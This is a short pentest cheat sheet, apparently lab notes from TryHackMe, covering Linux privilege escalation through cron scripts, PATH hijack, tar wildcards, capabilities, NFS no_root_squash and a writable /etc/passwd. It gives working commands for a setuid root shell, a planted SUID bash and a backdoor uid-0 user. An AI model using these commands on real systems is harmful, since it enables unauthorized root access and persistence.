---
tags: [privesc]
tools: []
ports: []
os: [linux]
phase: [privesc]
---
# Privesc - Linux cron and misc

**TL;DR:** The rest of the common Linux root paths: writable cron scripts, cron PATH hijack, dangerous capabilities, NFS `no_root_squash`, and a writable `/etc/passwd`.

from: TryHackMe Linux PrivEsc / PrivEsc Arena — verified vs common Linux LPE references

## Cron

```bash
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.*
# If a root cron job runs a script you can write -> put a reverse shell / chmod +s in it.
# If crontab PATH starts with a writable dir and a job calls a bare name,
# drop your own binary of that name earlier in PATH.
```
Wildcard injection: a root cron doing `tar czf ... *` in a writable dir → plant `--checkpoint` files (GTFOBins "tar").

## Capabilities

```bash
getcap -r / 2>/dev/null
# cap_setuid+ep on python/perl -> root:
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## NFS no_root_squash

```bash
# On target:
cat /etc/exports        # look for no_root_squash
# On attacker (as root), mount the share, drop a root-owned SUID shell:
mount -t nfs <IP>:/share /mnt; cp /bin/bash /mnt/bash; chmod +s /mnt/bash
# Back on target: /share/bash -p
```

## Writable /etc/passwd

```bash
ls -l /etc/passwd        # world-writable? add a root user:
# openssl passwd -1 -salt x pass  -> hash
echo 'hax:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd; su hax
```

## Related

- [[Privesc - Linux enumeration]], [[Privesc - Linux sudo and SUID]]
